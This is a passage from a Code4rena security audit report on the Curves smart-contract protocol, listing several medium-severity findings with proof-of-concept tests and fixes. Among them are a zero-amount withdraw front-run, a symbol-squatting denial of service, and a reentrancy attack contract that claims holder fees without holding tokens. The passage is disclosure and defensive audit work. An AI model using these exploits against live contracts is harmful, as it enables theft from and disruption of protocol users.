*Submitted by [iamandreiski](https://github.com/code-423n4/2024-01-curves-findings/issues/647), also found by [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/1537), [dutra](https://github.com/code-423n4/2024-01-curves-findings/issues/1478), [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1468), [m4ttm](https://github.com/code-423n4/2024-01-curves-findings/issues/1424), [peritoflores](https://github.com/code-423n4/2024-01-curves-findings/issues/1403), [cheatc0d3](https://github.com/code-423n4/2024-01-curves-findings/issues/1370), [imare](https://github.com/code-423n4/2024-01-curves-findings/issues/1255), [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/1240), [FastChecker](https://github.com/code-423n4/2024-01-curves-findings/issues/1205), [Soul22](https://github.com/code-423n4/2024-01-curves-findings/issues/1158), [kodyvim](https://github.com/code-423n4/2024-01-curves-findings/issues/1103), [deepplus](https://github.com/code-423n4/2024-01-curves-findings/issues/1099), [whoismatthewmc1](https://github.com/code-423n4/2024-01-curves-findings/issues/1085), nonseodion ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1051), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/888)), [Matue](https://github.com/code-423n4/2024-01-curves-findings/issues/997), [erebus](https://github.com/code-423n4/2024-01-curves-findings/issues/977), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/953), [Draiakoo](https://github.com/code-423n4/2024-01-curves-findings/issues/943), [LouisTsai](https://github.com/code-423n4/2024-01-curves-findings/issues/840), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/815), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/809), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/773), [BugzyVonBuggernaut](https://github.com/code-423n4/2024-01-curves-findings/issues/739), [KupiaSec](https://github.com/code-423n4/2024-01-curves-findings/issues/724), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/666), [jesjupyter](https://github.com/code-423n4/2024-01-curves-findings/issues/610), [PENGUN](https://github.com/code-423n4/2024-01-curves-findings/issues/576), [spacelord47](https://github.com/code-423n4/2024-01-curves-findings/issues/534), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/492), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/483), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/462), [DanielArmstrong](https://github.com/code-423n4/2024-01-curves-findings/issues/455), nmirchev8 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/447), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/323)), [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/436), [Mylifechangefast\_eth](https://github.com/code-423n4/2024-01-curves-findings/issues/407), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/396), [zaevlad](https://github.com/code-423n4/2024-01-curves-findings/issues/348), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/322), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/294), [AlexCzm](https://github.com/code-423n4/2024-01-curves-findings/issues/283), [51l3nt](https://github.com/code-423n4/2024-01-curves-findings/issues/280), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/260), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/249), [ZanyBonzy](https://github.com/code-423n4/2024-01-curves-findings/issues/237), [ubl4nk](https://github.com/code-423n4/2024-01-curves-findings/issues/229), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/213), [pkqs90](https://github.com/code-423n4/2024-01-curves-findings/issues/202), [israeladelaja](https://github.com/code-423n4/2024-01-curves-findings/issues/102), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/77), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/46), and [haxatron](https://github.com/code-423n4/2024-01-curves-findings/issues/21)*

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L338-L362> 

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L47>

If a malicious user or just an unbeknownst one decides to name/set their curve token symbol as "CURVE N" "N" can/will be substituted to whatever the next number is in the `_curvesTokenCounter` it can render the whole default naming functionality in the protocol useless as it will be DoS'd indefinitely.

### Proof of Concept

When a user decides to call the `buyCurvesTokenWithName` without specifying the name/symbol of their token and/or their token hasn't been deployed and exists without a name/symbol and calls `mint()`, `withdraw()` etc. without setting the name/symbol they will be assigned a default one.

The default name/symbol will be assigned using the following lines of code:

      // If the token's symbol is CURVES, append a counter value
            if (keccak256(bytes(symbol)) == keccak256(bytes(DEFAULT_SYMBOL))) {
                _curvesTokenCounter += 1;
                name = string(abi.encodePacked(name, " ", Strings.toString(_curvesTokenCounter)));
                symbol = string(abi.encodePacked(symbol, Strings.toString(_curvesTokenCounter)));
            }

            if (symbolToSubject[symbol] != address(0)) revert InvalidERC20Metadata();

Since two exact symbols can't coexist in the Curves ecosystem, due to symbol checks (as shown in if the if-clause above) a malicious user can decide to set their token symbol as "CURVES N" -> substituting the N with whatever the next number is in the `_curvesTokenCounter`.

Example if currently `_curvesTokenCounter` = 4, they can set their symbol as "CURVES 5" and this will render the whole default naming functionality of the protocol obsolete indefinitely.

Even though `setNameAndSymbol()` exists (which prevents a complete protocol DoS) and users will be able to manually set their name/symbol since the default functionality won't work; this still renders the whole default naming functionality useless and inoperable.

Foundry Proof of Concept to show this:

        function testTokenDefaultNaming() public {

            //user1 creates a token without assigning it a name/symbol
            vm.startPrank(user1);
            curves.buyCurvesToken(user1, 1);
            vm.stopPrank();

            //user2 creates another token with name/symbol as the default ones next in line
            vm.prank(user2);
            curves.buyCurvesTokenWithName(user2, 1, "Curves 1", "CURVES1");

            //This will always revert as default naming functionality won't work anymore
            vm.startPrank(user1);
            vm.expectRevert();
            curves.withdraw(user1, 1);
            vm.stopPrank();
        }

### Recommended Mitigation Steps

Forbid users to include CURVES in their symbol by including checks when manually setting name/symbol or creating a token with name/symbol and reserve these keywords only for the default naming functionality or rethink how the architecture can be changed to make including symbols/names by users mandatory.

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/647#issuecomment-2073080054)**

***

## [[M-04] Withdrawing with amount `= 0` will forcefully set name and symbol to default and disable some functions for token subject](https://github.com/code-423n4/2024-01-curves-findings/issues/608)
*Submitted by [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/608), also found by [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/450), [gkrastenov](https://github.com/code-423n4/2024-01-curves-findings/issues/1411), [Nikki](https://github.com/code-423n4/2024-01-curves-findings/issues/1289), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1265), [imare](https://github.com/code-423n4/2024-01-curves-findings/issues/1252), [gesha17](https://github.com/code-423n4/2024-01-curves-findings/issues/1207), [burhan\_khaja](https://github.com/code-423n4/2024-01-curves-findings/issues/1193), [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/1126), nonseodion ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1041), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/907)), [HChang26](https://github.com/code-423n4/2024-01-curves-findings/issues/1006), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/927), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/903), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/898), [matejdb](https://github.com/code-423n4/2024-01-curves-findings/issues/851), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/824), [th13vn](https://github.com/code-423n4/2024-01-curves-findings/issues/776), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/712), [para8956](https://github.com/code-423n4/2024-01-curves-findings/issues/673), [merlinboii](https://github.com/code-423n4/2024-01-curves-findings/issues/577), [jasonxiale](https://github.com/code-423n4/2024-01-curves-findings/issues/552), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/509), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/339), [0xPluto](https://github.com/code-423n4/2024-01-curves-findings/issues/98), [y4y](https://github.com/code-423n4/2024-01-curves-findings/issues/62), and [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1514)*

- Name and symbol is forcefully set to default value before the token subject can do anything.
- Disable functions `mint`, `setNameAndSymbol` and `buyCurvesTokenWithName` for token subject

### Proof of Concept

Function `withdraw` is used by contract `Curves` to allow users to withdraw tokens to external ERC20 tokens. The function is currently implemented as:

```solidity
function withdraw(address curvesTokenSubject, uint256 amount) public {
        if (amount > curvesTokenBalance[curvesTokenSubject][msg.sender]) revert InsufficientBalance();

        address externalToken = externalCurvesTokens[curvesTokenSubject].token;
        if (externalToken == address(0)) {
            if (
                keccak256(abi.encodePacked(externalCurvesTokens[curvesTokenSubject].name)) ==
                keccak256(abi.encodePacked("")) ||
                keccak256(abi.encodePacked(externalCurvesTokens[curvesTokenSubject].symbol)) ==
                keccak256(abi.encodePacked(""))
            ) {
                externalCurvesTokens[curvesTokenSubject].name = DEFAULT_NAME;
                externalCurvesTokens[curvesTokenSubject].symbol = DEFAULT_SYMBOL;
            }
            _deployERC20(
                curvesTokenSubject,
                externalCurvesTokens[curvesTokenSubject].name,
                externalCurvesTokens[curvesTokenSubject].symbol
            );
            externalToken = externalCurvesTokens[curvesTokenSubject].token;
        }
        _transfer(curvesTokenSubject, msg.sender, address(this), amount);
        CurvesERC20(externalToken).mint(msg.sender, amount * 1 ether);
    }
```

The function will check if `externalToken == address(0)`, if so, they will deploy the token. This part of code stays behind the condition `if (amount > curvesTokenBalance[curvesTokenSubject][msg.sender]) revert InsufficientBalance()`.

The problem is, the function does not check if the withdraw amount is `0`. If withdraw is called with amount `= 0`, then the token is deployed with default name and symbol before token subject can do anything. The token once deployed cannot be redeployed and the name and symbol stays there forever. Also, since the token is already deployed, function mint, `setNameAndSymbol` and `buyCurvesTokenWithName` will all revert when the token subject call them.

Below is a POC for the above issue, save them to file `test/curves-erc20.WithdrawFrontrun.ts` and run it using command: `npx hardhat test test/curves-erc20.WithdrawFrontrun.ts`.

<details>

```typescript
import { expect, use } from "chai";
import { solidity } from "ethereum-waffle";
use(solidity);
import { parseEther } from "@ethersproject/units";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
//@ts-ignore
import { ethers } from "hardhat";

import { type Curves, CurvesERC20Factory, ERC20__factory } from "../contracts/types";
import {CurvesERC20__factory} from "../contracts/types/factories/CurvesERC20__factory";
import { TradeEvent } from "../contracts/types/Curves";
import { buyToken } from "../tools/test.helpers";
import { deployCurveContracts } from "./test.helpers";

describe("Curves ERC20 test", () => {
  let testContract: Curves, owner: SignerWithAddress, friend: SignerWithAddress, addrs: SignerWithAddress[];

  beforeEach(async () => {
    [owner, friend, ...addrs] = await ethers.getSigners();
    testContract = await deployCurveContracts();
  });


  describe("ERC20 test", () => {
    it("Front run withdraw to set name and symbol to default", async () => {

      // Before owner can do anything, attacker can run withdraw with amount = 0
      await testContract.connect(friend).withdraw(owner.address, 0);
      const keyTokenAddress = (await testContract.externalCurvesTokens(owner.address)).token;
      const keyToken = CurvesERC20__factory.connect(keyTokenAddress, owner);

      // external token is already deployed with default name and symbol
      expect(await keyToken.name()).to.equal("Curves 1");
      expect(await keyToken.symbol()).to.equal("CURVES1");

      // Now the token subject cannot call function mint, setNameAndSymbol,buyCurvesTokenWithName
      let tx = testContract.mint(owner.address);
      expect(tx).to.be.revertedWith("ERC20TokenAlreadyMinted()");

      tx = testContract.setNameAndSymbol(owner.address, "Custom name", "SYMBOL123");
      expect(tx).to.be.revertedWith("ERC20TokenAlreadyMinted()");

      tx = testContract.buyCurvesTokenWithName(owner.address, 1, "Custom name", "SYMBOL123");
      expect(tx).to.be.revertedWith("ERC20TokenAlreadyMinted()");

    });
  });
});
```

</details>

### Recommended Mitigation Steps

I recommend you forbid calling function withdraw with amount `= 0`.

**[andresaiello (Curves) acknowledged](https://github.com/code-423n4/2024-01-curves-findings/issues/608#issuecomment-2073080458)**

***

## [[M-05] Stuck rewards in `FeeSplitter` contract](https://github.com/code-423n4/2024-01-curves-findings/issues/403)
*Submitted by [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/403), also found by [ether\_sky](https://github.com/code-423n4/2024-01-curves-findings/issues/1560), [visualbits](https://github.com/code-423n4/2024-01-curves-findings/issues/1476), [m4ttm](https://github.com/code-423n4/2024-01-curves-findings/issues/1472), and [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/918)*

Curves protocol incentivize users to buy subjects and hold it for a prolonged time to receive high rewards, and the claimable rewards amount entitled for each user is calculated based on the user subject balance times the difference between the subject `cumulativeFeePerToken` and the user's `userFeeOffset` of that subject, where the user's `userFeeOffset` is updated whenever he buys or sells that specific subject:

          ```javascript
              function onBalanceChange(address token, address account) public onlyManager {
                  TokenData storage data = tokensData[token];
                  data.userFeeOffset[account] = data.cumulativeFeePerToken;
                  if (balanceOf(token, account) > 0) userTokens[account].push(token);
              }
          ```

The `cumulativeFeePerToken` is updated by an increment of `msg.value / PRECISION`, where `msg.value` represents the `holdersFee` amount that is deducted from each selling/purchase price of each subject token, and this value is accumulated to be claimed later by that subject holders (via `FeeSplitter.addFees` function):

    ```javascript
    function addFees(address token) public payable onlyManager {
            uint256 totalSupply_ = totalSupply(token);
            if (totalSupply_ == 0) revert NoTokenHolders();
            TokenData storage data = tokensData[token];
            //@audit-issue : the more the totalSupply increases the more stuck rewards (division loss)
            data.cumulativeFeePerToken += (msg.value * PRECISION) / totalSupply_;
        }
    ```

But there's an issue with this implementation:

- **There will be always a locked amount** in the contract equals to the latest subject's `cumulativeFeePerToken`, and this amount will be stuck and not utilized as there's no way to withdraw them from the splitter contract (no withdraw function to rescue any stuck funds in excess of the contracts's needs).
- These stuck accrued rewards will never be fully claimed as well and will be increasing with each purchase or selling of that subject, because users will be able to claim rewards based on their subject balance times the difference between the subject `cumulativeFeePerToken` and the user's `userFeeOffset` of that subject only.

This issue is presented in the PoC section below, where all subject holders claim their rewards while there's still a stuck amount of that subject rewards in the contract.

### Proof of Concept

[FeeSplitter.addFees function](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L89-L94)

```javascript
    function addFees(address token) public payable onlyManager {
        uint256 totalSupply_ = totalSupply(token);
        if (totalSupply_ == 0) revert NoTokenHolders();
        TokenData storage data = tokensData[token];
        data.cumulativeFeePerToken += (msg.value * PRECISION) / totalSupply_;
    }
```

### Foundry PoC:

1. **Test Setup:** Foundry is used to write a PoC that illustrates this vulnerability, in order to setup Foundry testing environment in a project that uses hardhat, follow these steps/run the following commands in the project main directory:

    *   yarn add --dev @nomicfoundation/hardhat-foundry
    *   in `hardhat.config.ts` file , import:
        `import "@nomicfoundation/hardhat-foundry";`
    *   npx hardhat init-foundry

2. Add this `FeeSplitterTest.t.sol` test file in the following directory `2024-01-curves/test/FeeSplitterTest.t.sol`:

<details>

    ```
    ├── 2024-01-curves
    │   ├── test
    │       ├──FeeSplitterTest.t.sol
    ```

    ```javascript
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.7;

    import {Test, console2} from "forge-std/Test.sol";
    import {Curves} from "../contracts/Curves.sol";
    import {CurvesERC20Factory} from "../contracts/CurvesERC20Factory.sol";
    import {FeeSplitter} from "../contracts/FeeSplitter.sol";
    import {CurvesERC20} from "../contracts/CurvesERC20.sol";
    import "@openzeppelin/contracts/utils/Strings.sol";

    contract FeeSplitterTest is Test {
        Curves public curves;
        CurvesERC20Factory public factory;
        FeeSplitter public feeSplitter;
        //fees:
        uint256 i_protocolFee = 5e16; // 5%
        uint256 i_subjectFee = 5e16; // 5%
        uint256 i_referralFee = 0; // 0%
        uint256 i_holdersFee = 5e16; // 5%
        //fee destination:
        address protocolFeeDestination = makeAddr("protocolFeeDestination");

        //subjects addresses:
        address subjectOne = makeAddr("subjectOne");
        //subject tokens addresses:
        address subjectOneToken;

        function setUp() public {
            //1. deploy required contracts:
            feeSplitter = new FeeSplitter();
            factory = new CurvesERC20Factory();
            curves = new Curves(address(factory), address(feeSplitter));
            feeSplitter.setCurves(curves);

            //2. set fees:
            curves.setMaxFeePercent(i_protocolFee + i_subjectFee + i_holdersFee);
            curves.setProtocolFeePercent(i_protocolFee, protocolFeeDestination);
            curves.setExternalFeePercent(i_subjectFee, i_referralFee, i_holdersFee);

            //3.add a subject token:
            vm.startPrank(subjectOne);
            curves.buyCurvesTokenWithName(subjectOne, 1, "subjectOne", curves.DEFAULT_SYMBOL());
            subjectOneToken = curves.symbolToSubject("CURVES1");
            vm.stopPrank();
        }

        function testSetUp() public {
            // test fee setup:
            (uint256 protocolFee, uint256 subjectFee, uint256 referralFee, uint256 holdersFee, ) = curves.getFees(1 ether);

            assertGt(protocolFee, 0);
            assertGt(subjectFee, 0);
            assertEq(referralFee, 0);
            assertGt(holdersFee, 0);

            // test if subject token is created:
            assertFalse(subjectOneToken == address(0));
        }

        //! forge test --mt testDrainFeeSplitter
        function testDrainFeeSplitter() public {
            uint256 numberOfBuyers = 100;
            address[] memory buyers = new address[](numberOfBuyers);
            uint256 boughtAmount = 200; // each one of the buyers will buy 200 subject tokens

            //1. 100 users buy subjectOne token:
            for (uint256 i; i < numberOfBuyers; ++i) {
                buyers[i] = makeAddr(string(Strings.toString(i)));
                uint256 buyerBalanceBefore = curves.curvesTokenBalance(subjectOne, buyers[i]);
                assert(buyerBalanceBefore == 0);
                uint256 price = curves.getBuyPriceAfterFee(subjectOne, boughtAmount + i);

                vm.deal(buyers[i], price);
                vm.startPrank(buyers[i]);
                curves.buyCurvesToken{value: price}(subjectOne, boughtAmount + i);
                vm.stopPrank();

                uint256 buyerBalanceAfter = curves.curvesTokenBalance(subjectOne, buyers[i]);
                assert(buyerBalanceAfter == boughtAmount + i);
            }

            uint256 feeSplitterBalanceBeforeClaims = address(feeSplitter).balance;

            // 2. now these users will claim their rewards from the splitter contract:
            uint256 totalClaimableByUsers;
            for (uint256 i; i < numberOfBuyers; ++i) {
                uint256 buyerETHBalanceBefore = buyers[i].balance;
                assert(buyerETHBalanceBefore == 0);
                uint256 claimedFeesByBuyer = feeSplitter.getClaimableFees(subjectOne, buyers[i]);

                vm.startPrank(buyers[i]);
                feeSplitter.claimFees(subjectOne);
                vm.stopPrank();

                uint256 buyerETHBalanceAfter = buyers[i].balance;
                assertGt(buyerETHBalanceAfter, buyerETHBalanceBefore);
                assert(buyerETHBalanceAfter == claimedFeesByBuyer);

                totalClaimableByUsers += claimedFeesByBuyer;
            }

            //3. As can be noticed: the splitter balance is larger than the claimable rewards which will result in the difference being stuck in the contract:
            uint256 feeSplitterBalanceAfterClaims = address(feeSplitter).balance;
            assertGt(totalClaimableByUsers - feeSplitterBalanceAfterClaims, 0); // stucke balance

            assert(feeSplitterBalanceBeforeClaims - totalClaimableByUsers == feeSplitterBalanceAfterClaims);
            console2.log("totalClaimableByUsers (# of ETH): ", totalClaimableByUsers / 1e18);
            console2.log("--------------------------------------------------");
            console2.log("stuck rewards in the splitter contract (# of ETH): ", feeSplitterBalanceAfterClaims / 1e18);

            //4. to prove it more, another purchase is made, and the buyer claimed his rewards while the stuck amount is increased:
            address lastBuyer = makeAddr("lastBuyer");
            uint256 price = curves.getBuyPriceAfterFee(subjectOne, boughtAmount);

            //---------- buying subjectOne tokens:
            vm.deal(lastBuyer, price);
            vm.startPrank(lastBuyer);
            curves.buyCurvesToken{value: price}(subjectOne, boughtAmount);

            //---------- lastBuyer claims his rewards:
            feeSplitter.claimFees(subjectOne);
            vm.stopPrank();

            //-----
            console2.log("--------------------------------------------------");
            console2.log(
                "stuck rewards in the splitter contract after the lastBuyer claimed his rewards (# of ETH): ",
                address(feeSplitter).balance / 1e18
            );
        }
    }
    ```

</details>

3. Explained scenario:

    1. The assumption made is that buyers will claim their rewards based on the same bought balance without manipulating it with direct transfers, otherwise another vulnerability is introduced (check issue under the title : "Any subject holder can drain the `FeeSplitter` contract funds").
    2. 100 buyer purchase a specific amount of subjectOne token.
    3. Then all buyers claim their rewards from the splitter contract.
    4. There's a stuck amount of subject rewards that will never be utilized, and this amount equals to the latest `cumulativeFeePerToken` of that subject.
    5. To illustrate this more; another buyer (lastBuyer) buys subjectOne tokens and claim his rewards, and as can be noticed: more rewards stuck in the contract.

4. Test result:

    ```
    $ forge test --mt testDrainFeeSplitter -vvv
    Running 1 test for test/FeeSplitterTest.t.sol:FeeSplitterTest
    [PASS] testDrainFeeSplitter() (gas: 24258455)
    Logs:
    totalClaimableByUsers (# of ETH):  16178590
    --------------------------------------------------
    stuck rewards in the splitter contract (# of ETH):  963
    --------------------------------------------------
    stuck rewards in the splitter contract after the lastBuyer claimed his rewards (# of ETH):  390051

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 52.28ms
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
    ```

### Tools Used

Foundry

### Recommended Mitigation Steps

Implement a mechanism to utilize these stuck rewards or withdraw them; or modify the current rewarding mechanism to prevent any stuck rewards in the future.

**[andresaiello (Curves) acknowledged](https://github.com/code-423n4/2024-01-curves-findings/issues/403#issuecomment-1910736569)**

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-curves-findings/issues/403)._

***

## [[M-06] A subject creator within a single block can claim holder fees without holding due to unprotected reentrancy path](https://github.com/code-423n4/2024-01-curves-findings/issues/386)
*Submitted by [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/386), also found by [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/1440), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/1295), [spaghetticode\_sentinel](https://github.com/code-423n4/2024-01-curves-findings/issues/1288), [0xNaN](https://github.com/code-423n4/2024-01-curves-findings/issues/1211), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/878), [xiao](https://github.com/code-423n4/2024-01-curves-findings/issues/870), [0xPhantom](https://github.com/code-423n4/2024-01-curves-findings/issues/821), [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/746), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/717), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/486), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/410), [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/393), [Kow](https://github.com/code-423n4/2024-01-curves-findings/issues/93), and kutugu ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/51), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/38))*

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L236-L241> 

<https://gist.github.com/nuthan2x/bb0ecf745abfdc37ce374f6af0d83699#L17> 

<https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L80>

A subject creater can keep on [claiming holder fees](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L80) on every [buy](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L211) and [sell](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L282) transaction even when he doesn't hold the balance. This claiming of holder fees without holding is possible due to a combination of reentrancy and usage of `call` instead of `transfer` while [transferring the subject fees](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L236).

A subject can perform this attack by:

1. Buy some curves initially.
2. [mint and lock](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L465) them in curves. The external minted tokens can be used on bridges or AMMs.
3. Now, when someone buys/sells, subject fee is transferred on [\_transferFees](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L236) call.
4. Using this external call, the subject when receiving the ether, can withdraw tokens from bridge/AMM and then burn those tokens to get the curves. Then use those curves updated balance, to [claim the updated holder fees](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L80). Then lock those curves again and mint external tokens, then lock them on Bridge/AMM.
5. For attacker to claim this holder fees unethically, only once every two transactions of [buy](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L211) and [sell](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L282). Because, the holder fee is updated after sending the subject fees. So previous update of the holders fees can be claimed only next time someone buys/sells.

### Proof of Concept

For readable POC see below, but for full foundry setup of the poc test, copy and paste this [gist](https://gist.github.com/nuthan2x/bb0ecf745abfdc37ce374f6af0d83699#file-test-sol-L17) to `test/Test.sol` directory and run `forge t --mt  test_Attack_POC -vvvv`:

<details>

```solidity
    bool claimThisTime; // claim once every two buy/sell transactions of the subject (reduce gas usage)
    bool holderFeeClaimOn; // dont do any reentrancy when holder fees are received, but reenter on only subject fee receiving time.

///////////////////////// POC //////////////////////////////////////////////

    function test_Attack_POC() public {
        deal(address(feeSplitter), 1 ether);

        // subject creator buying 10 more curves
        uint amountToSend = curves.getBuyPrice(address(CREATOR), 10) * 2;
        deal(address(this), amountToSend);
        curves.buyCurvesToken{value : amountToSend}(address(CREATOR), 10);

        // subject creator minting external tokens and supplies it to some uniswap pool or locked in bridge
        uint mintAmount = curves.curvesTokenBalance(address(CREATOR), address(this));
        if(mintAmount > 1) curves.withdraw(address(CREATOR), mintAmount - 1); // tokens locking

        // claiming till now, to prove that this below attack is possible
        uint claimable = feeSplitter.getClaimableFees(address(CREATOR), address(this));
        holderFeeClaimOn = true;
        if(claimable > 0) feeSplitter.claimFees(address(CREATOR));
        holderFeeClaimOn = false;


        // normal user buying 200 curves
        amountToSend = curves.getBuyPrice(address(CREATOR), 200) * 2;
        deal(address(NORMAL_USER), amountToSend);
        vm.prank(NORMAL_USER);
        curves.buyCurvesToken{value : amountToSend}(address(CREATOR), 200);

        // normal user buying 200 curves
        amountToSend = curves.getBuyPrice(address(CREATOR), 200) * 2;
        deal(address(NORMAL_USER), amountToSend);
        vm.prank(NORMAL_USER);
        curves.buyCurvesToken{value : amountToSend}(address(CREATOR), 200);
    }

    receive() external payable {
        if(holderFeeClaimOn) return;

        (, , address externalToken) = curves.externalCurvesTokens(address(CREATOR));
        claimThisTime = !claimThisTime;

        if(externalToken != address(0) && claimThisTime == true) {
            uint burnAmount = CurvesERC20(externalToken).balanceOf(address(this));  //  tokens unlocking
            if(burnAmount > 0) curves.deposit(address(CREATOR), burnAmount);

            uint claimable = feeSplitter.getClaimableFees(address(CREATOR), address(this));
            if(claimable > 0) {
                holderFeeClaimOn = true;
                feeSplitter.claimFees(address(CREATOR));
                holderFeeClaimOn = false;
            } 

            uint mintAmount = curves.curvesTokenBalance(address(CREATOR), address(this));
            if(mintAmount > 1) curves.withdraw(address(CREATOR), mintAmount - 1); // mintAmount tokens locking again, after claiming
        }
    }
```

</details>

### Tools Used

Forge testing.

### Recommended Mitigation Steps

Since this attack is possible for both subjects and referrers, mitigate as recommended below. Use `transfer`, instead of `call` on [subject/referral fee transfers](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L236-L241), so that only `2300` units of gas is alloted when receiving, and is not possible to perform any reentrancy attack.

Or, implement [Reentrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) from openzeppelin library.

<details>

```diff
function _transferFees(
        address curvesTokenSubject,
        bool isBuy,
        uint256 price,
        uint256 ,
        uint256 
    ) internal {
        (uint256 protocolFee, uint256 subjectFee, uint256 referralFee, uint256 holderFee, ) = getFees(price);
        {
            bool referralDefined = referralFeeDestination[curvesTokenSubject] != address(0);
            {
                address firstDestination = isBuy ? feesEconomics.protocolFeeDestination : msg.sender;
                uint256 buyValue = referralDefined ? protocolFee : protocolFee + referralFee;
                uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;
                (bool success1, ) = firstDestination.call{value: isBuy ? buyValue : sellValue}("");
                if (!success1) revert CannotSendFunds();
            }
            {
-               (bool success2, ) = curvesTokenSubject.call{value: subjectFee}("");
-               if (!success2) revert CannotSendFunds();
+               payable(curvesTokenSubject).transfer(subjectFee);
            }
            {
-               (bool success3, ) = referralDefined
-                   ? referralFeeDestination[curvesTokenSubject].call{value: referralFee}("")
-                   : (true, bytes(""));
-               if (!success3) revert CannotSendFunds();
+               if(referralDefined) payable(referralFeeDestination[curvesTokenSubject]).transfer(referralFee);
            }

            if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
                feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
                feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
            }
        }
    }
```

</details>

**[raymondfam (Lookout) commented](https://github.com/code-423n4/2024-01-curves-findings/issues/386#issuecomment-1899787518):**
 > `data.userFeeOffset[account] = data.cumulativeFeePerToken` will take care of it when `updateFeeCredit()` is triggered in `claimFees()`. You can only do it once.

**[alcueca (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-curves-findings/issues/386#issuecomment-1933935507):**
